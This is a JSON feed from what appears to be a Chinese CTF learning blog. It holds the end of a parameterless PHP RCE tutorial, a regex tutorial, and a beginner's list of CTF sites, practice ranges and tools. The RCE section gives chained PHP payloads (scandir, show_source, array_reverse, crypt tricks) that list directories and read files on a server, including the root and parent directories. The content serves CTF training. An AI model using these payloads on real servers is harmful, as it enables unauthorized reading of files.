class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>array_reverse\t将数组逆序</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">current</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h5 id=\"读取倒数第二个文件\"><a class=\"anchor\" href=\"#读取倒数第二个文件\">#</a> 读取倒数第二个文件</h5>\n<p>next\t将数组的指针后移一位</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_reverse</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"读取上一级文件目录\"><a class=\"anchor\" href=\"#读取上一级文件目录\">#</a> 读取上一级文件目录</h4>\n<p>dirname\t返回路径中的目录部分，dirname ('/var/www/html') 返回 /var/www</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">dirname</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>chdir\t改变当前目录</p>\n<p>scandir (getcwd ()) 出现的数组第二个就是 &quot;..&quot;，所以可以用 next () 获取</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>或者</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">next</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token function\">hebrevc</span><span class=\"token punctuation\">(</span><span class=\"token function\">crypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">time</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>读取其他目录的文件都与这个类似</p>\n<h4 id=\"读取根目录\"><a class=\"anchor\" href=\"#读取根目录\">#</a> 读取根目录</h4>\n<p>strrev (crypt (serialize (array ()))) 也有几率得到 /</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">chr</span><span class=\"token punctuation\">(</span><span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token function\">strrev</span><span class=\"token punctuation\">(</span><span class=\"token function\">crypt</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"随机读取文件\"><a class=\"anchor\" href=\"#随机读取文件\">#</a> 随机读取文件</h4>\n<p>array_flip\t将数组键和值交换<br />\n array_rand\t随机选取数组的键</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">show_source</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_rand</span><span class=\"token punctuation\">(</span><span class=\"token function\">array_flip</span><span class=\"token punctuation\">(</span><span class=\"token function\">scandir</span><span class=\"token punctuation\">(</span><span class=\"token function\">getcwd</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"tip\"><a class=\"anchor\" href=\"#tip\">#</a> tip</h4>\n<p>上述方法不唯一，可以自行构造，使用其他方法来达到效果</p>\n",
            "tags": [
                "web",
                "无参数rce",
                "web"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/04/16/%E5%88%9D%E8%AF%86%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "url": "http://m3k0mi.github.io/2024/04/16/%E5%88%9D%E8%AF%86%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/",
            "title": "初识正则表达式",
            "date_published": "2024-04-16T06:34:12.000Z",
            "content_html": "<p>正则表达式 (Regular Expression) 是一种文本模式，包括普通字符（例如，a 到 z 之间的字母）和特殊字符（称为 &quot;元字符&quot;），可以用来描述和匹配字符串的特定模式。</p>\n<p>其实正则表达式就是用来匹配文本的，可以匹配一个或多个字符，灵活地运用正则表达式，就可以完成一些复杂的操作，比如：</p>\n<p>​\t\tEmail 地址：</p>\n<pre><code>^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+$\n</code></pre>\n<p>​\t\t域名：</p>\n<pre><code>[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.?\n</code></pre>\n<p>接下来就对正则表达式进行拆分学习</p>\n<h3 id=\"php中常用函数\"><a class=\"anchor\" href=\"#php中常用函数\">#</a> php 中常用函数</h3>\n<p>在 php 当中，用到正则的函数有：preg_match、preg_replace、preg_match_all 等</p>\n<p>就拿 preg_match 来说，一般用法为</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pattern</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$subject</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>pattern</p>\n<p>​\t要搜索的模式，字符串类型。</p>\n<p>subject</p>\n<p>​\t输入字符串。</p>\n<p>所以</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/abc/'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span></span></pre></td></tr></table></figure><p>匹配的就是包含 'abc' 的字符串，比如 'abc'、'abcd' 等</p>\n<p>从上述例子也可以看出，正则一般使用时会加上 //</p>\n<h3 id=\"元字符\"><a class=\"anchor\" href=\"#元字符\">#</a> 元字符</h3>\n<p>如果只有普通的字符来匹配正则，肯定是没法满足的，所以就有了很多特异功能的字符</p>\n<h4 id=\"\"><a class=\"anchor\" href=\"#\">#</a> .</h4>\n<p>. 匹配任意单个字符，但是不匹配换行符</p>\n<p>.a 匹配 aa、ba、ca、1a 等</p>\n<h4 id=\"字符集\"><a class=\"anchor\" href=\"#字符集\">#</a> 字符集 [ ]</h4>\n<p>[ ] 用来指定一个字符集，只要匹配到了字符集里的任意一个字符就可以</p>\n<p>[Tt] he 匹配 The、the</p>\n<h4 id=\"否定字符集\"><a class=\"anchor\" href=\"#否定字符集\">#</a> 否定字符集</h4>\n<p>在字符集当中 ^ 表示否定</p>\n<p>[^t] he 匹配 ahe、bhe、1he 等等，但是不匹配 the</p>\n<h4 id=\"-2\"><a class=\"anchor\" href=\"#-2\">#</a> *</h4>\n<p>* 匹配在该符号之前出现的次数大于等于 0 次</p>\n<p>c*ar 匹配 ar、car、ccar、cccar 等</p>\n<h4 id=\"-3\"><a class=\"anchor\" href=\"#-3\">#</a> +</h4>\n<p>+ 与上个字符类似，匹配该字符之前出现的次数 &gt;=1 次</p>\n<p>c+at 匹配 cat、ccat 但不匹配 at</p>\n<h4 id=\"-4\"><a class=\"anchor\" href=\"#-4\">#</a> ?</h4>\n<p>标记在符号前面的字符为可选，即出现 0 或 1 次</p>\n<p>例如 [T]?he 匹配字符串 he 和 The</p>\n<h4 id=\"-5\"><a class=\"anchor\" href=\"#-5\">#</a> {}</h4>\n<p>是一个量词，常用来限定一个或一组字符可以重复出现的次数。</p>\n<p>例如</p>\n<pre><code>[0-9]&#123;2,3&#125;\n</code></pre>\n<p>匹配最少两位最多三位的 0~9 的数字 如：999 10 等</p>\n<h4 id=\"特征标群\"><a class=\"anchor\" href=\"#特征标群\">#</a> 特征标群 (...)</h4>\n<p>(...) 中包含的内容会被看成一个整体，和数学中的小括号 () 作用相同</p>\n<p>例如 (th) e 匹配 the，不匹配 te、he，注意跟字符集 [ ] 区分开来</p>\n<h4 id=\"或运算符\"><a class=\"anchor\" href=\"#或运算符\">#</a> 或运算符 |</h4>\n<p>用作判断条件</p>\n<p>例如 (T|t) he 匹配 the The</p>\n<h4 id=\"转码特殊字符\"><a class=\"anchor\" href=\"#转码特殊字符\">#</a> 转码特殊字符 \\</h4>\n<p>反斜杠 \\ 在表达式中用于转码紧跟其后的字符，用于指定 {} [] / \\ + * . $ ^ | ? 这些特殊字符</p>\n<p>作用就是跟上边的元字符区分开来，例如</p>\n<pre><code>\\[\n</code></pre>\n<p>表示匹配 [字符，跟字符集区分开来</p>\n<h4 id=\"和\"><a class=\"anchor\" href=\"#和\">#</a> ^ 和 $</h4>\n<p>^ 匹配字符串输入的开始，$ 则匹配字符串输入的结束</p>\n<p>首先 (t|h) e 匹配 te、he、ahe 等，但是 ^(t|h) e，匹配的字符串必须以 te 或 he 开头</p>\n<p>$ 和 ^ 同理</p>\n<h3 id=\"简写字符集\"><a class=\"anchor\" href=\"#简写字符集\">#</a> 简写字符集</h3>\n<table>\n<thead>\n<tr>\n<th>简写字符集</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>.</td>\n<td>除换行符外所有字符</td>\n</tr>\n<tr>\n<td>\\w</td>\n<td>匹配所有字母数字</td>\n</tr>\n<tr>\n<td>\\W</td>\n<td>匹配所有非字母数字，即符号 等同于 [^ \\ w]</td>\n</tr>\n<tr>\n<td>\\d</td>\n<td>匹配数字</td>\n</tr>\n<tr>\n<td>\\D</td>\n<td>匹配非数字</td>\n</tr>\n<tr>\n<td>\\s</td>\n<td>匹配所有空格字符，等同于 [\\t\\n\\f\\r\\p {Z}]</td>\n</tr>\n<tr>\n<td>\\S</td>\n<td>匹配所有非空格字符 [^ \\ s]</td>\n</tr>\n<tr>\n<td>\\f</td>\n<td>匹配一个换页符</td>\n</tr>\n<tr>\n<td>\\n</td>\n<td>匹配一个换行符</td>\n</tr>\n<tr>\n<td>\\r</td>\n<td>匹配一个回车符</td>\n</tr>\n<tr>\n<td>\\t</td>\n<td>匹配一个制表符</td>\n</tr>\n<tr>\n<td>\\v</td>\n<td>匹配一个垂直制表符</td>\n</tr>\n<tr>\n<td>\\p</td>\n<td>匹配 CR/LF (等同于 \\r\\n)，用来匹配 DOS 终止符</td>\n</tr>\n</tbody>\n</table>\n<p>简写字符集主要是提供便利，比如我想匹配所有数字，只需要 \\d 就可以了，而不用 [0-9]</p>\n<h3 id=\"标记\"><a class=\"anchor\" href=\"#标记\">#</a> 标记</h3>\n<table>\n<thead>\n<tr>\n<th>标记</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>i</td>\n<td>不区分大小写：将匹配设置为不区分大小写。</td>\n</tr>\n<tr>\n<td>g</td>\n<td>全局搜索：搜索整个输入字符串中的所有匹配。</td>\n</tr>\n<tr>\n<td>m</td>\n<td>多行匹配：会匹配输入字符串每一行。</td>\n</tr>\n</tbody>\n</table>\n<p>比如我想匹配 cat 这个字符串，但是也想匹配 Cat，CAt，cAt 等等，一个一个写就会非常麻烦，只要用到标记 i，/cat/i 就可以不区分大小写匹配 cat 了</p>\n<p>正则在匹配到第一个就会结束，但是标记 g 可以让他继续匹配，从整个字符串找到匹配项</p>\n<h3 id=\"断言\"><a class=\"anchor\" href=\"#断言\">#</a> 断言</h3>\n<table>\n<thead>\n<tr>\n<th>断言</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>?=</td>\n<td>正向先行断言</td>\n</tr>\n<tr>\n<td>?!</td>\n<td>负向先行断言</td>\n</tr>\n<tr>\n<td>?&lt;=</td>\n<td>正向后行断言</td>\n</tr>\n<tr>\n<td>?&lt;!</td>\n<td>负向后行断言</td>\n</tr>\n</tbody>\n</table>\n<h4 id=\"-6\"><a class=\"anchor\" href=\"#-6\">#</a> ?=</h4>\n<p>正向先行断言表示后面必须跟着？= 定义的表达式</p>\n<p>例如：(T|t) he (?=\\sfat)</p>\n<p>这个正则由 3 个部分组成，(T|t) 表示 T 或 t 中的一个，he 字符串，(?=\\sfat) 正向先行断言，\\s 匹配所有空格符，表示后面必须跟着 空格 fat</p>\n<p>那么这段正则就匹配 the fat 或 The fat</p>\n<h4 id=\"-7\"><a class=\"anchor\" href=\"#-7\">#</a> ?!</h4>\n<p>负向先行断言就跟正向先行断言相反，表示后面不能跟着？！定义的表达式</p>\n<h4 id=\"-8\"><a class=\"anchor\" href=\"#-8\">#</a> ?&lt;=</h4>\n<p>正向后行断言表示前面必须跟着？= 定义的表达式</p>\n<p>(?&lt;=(T|t) he\\s)(fat|mat) 匹配 the 或 The 后面的 fat、mat</p>\n<h4 id=\"-9\"><a class=\"anchor\" href=\"#-9\">#</a> ?&lt;!</h4>\n<p>负向后行断言与正向先行断言相反，表示前面不能跟着？&lt;! 定义的表达式</p>\n<h3 id=\"应用\"><a class=\"anchor\" href=\"#应用\">#</a> 应用</h3>\n<p>看到这里，已经全部学会了，那么再回过头来看看前面举到的电子邮箱吧 (注意：正则可以有多种写法，不唯一)</p>\n<pre><code>^[a-zA-Z0-9_-]+@[a-zA-Z0-9_-]+(\\.[a-zA-Z0-9_-]+)+$\n</code></pre>\n<p>首先就是 ^ 和 $，表示开头和结尾</p>\n<p>然后这段正则可以分为四段</p>\n<pre><code>[a-zA-Z0-9_-]+ \t@\t[a-zA-Z0-9_-]+\t(\\.[a-zA-Z0-9_-]+)+\n</code></pre>\n<p>第一段表示多个字母或数字或下划线</p>\n<p>第二段就是字符 @</p>\n<p>第三段和第二段一样</p>\n<p>第四段表示。后面跟多个字母或数字或下划线</p>\n<p>组合起来如：123@123.com ，就是电子邮箱的格式</p>\n",
            "tags": [
                "正则表达式",
                "正则表达式"
            ]
        },
        {
            "id": "http://m3k0mi.github.io/2024/04/15/web%E5%85%A5%E9%97%A8/",
            "url": "http://m3k0mi.github.io/2024/04/15/web%E5%85%A5%E9%97%A8/",
            "title": "web入门",
            "date_published": "2024-04-15T12:09:10.000Z",
            "content_html": "<h3 id=\"入门指南\"><a class=\"anchor\" href=\"#入门指南\">#</a> 入门指南</h3>\n<h4 id=\"一些在线做题网站\"><a class=\"anchor\" href=\"#一些在线做题网站\">#</a> 一些在线做题网站：</h4>\n<ol>\n<li><a href=\"https://ctf.show/challenges\">https://ctf.show/challenges</a>\t(ctfshow)</li>\n<li><a href=\"https://adworld.xctf.org.cn\">https://adworld.xctf.org.cn</a>      (攻防世界)</li>\n<li><a href=\"https://ctf.bugku.com/\">https://ctf.bugku.com/</a>      (bugku)</li>\n<li><a href=\"https://www.ctfhub.com/\">https://www.ctfhub.com/</a>      (CTFhub)</li>\n<li><a href=\"https://www.nssctf.cn/\">https://www.nssctf.cn/</a>      (nssctf)</li>\n<li><a href=\"https://buuoj.cn/\">https://buuoj.cn/</a>      (buuctf)</li>\n</ol>\n<h4 id=\"靶场\"><a class=\"anchor\" href=\"#靶场\">#</a> 靶场：</h4>\n<ol>\n<li><a href=\"https://github.com/digininja/DVWA\">https://github.com/digininja/DVWA</a>\t(dvwa)</li>\n<li><a href=\"https://github.com/zhuifengshaonianhanlu/pikachu\">https://github.com/zhuifengshaonianhanlu/pikachu</a>      (pikachu)</li>\n<li><a href=\"https://github.com/Audi-1/sqli-labs\">https://github.com/Audi-1/sqli-labs</a>      (sqli-labs sql 注入靶场)</li>\n<li><a href=\"https://github.com/c0ny1/upload-labs\">https://github.com/c0ny1/upload-labs</a>      (upload-labs 文件上传靶场)</li>\n</ol>\n<p>搭建方法可网上搜索</p>\n<h4 id=\"工具\"><a class=\"anchor\" href=\"#工具\">#</a> 工具：</h4>\n<ol>\n<li>burpsuite (抓包软件)</li>\n<li>firefox 浏览器</li>\n<li>antsword 蚁剑</li>\n<li>kali 虚拟机</li>\n<li>dirsearch (扫描网站后台工具)</li>\n</ol>\n<p>#该文章测试用</p>\n",
            "tags": [
                "web",
                "入门",
                "web"
            ]
        }
    ]
}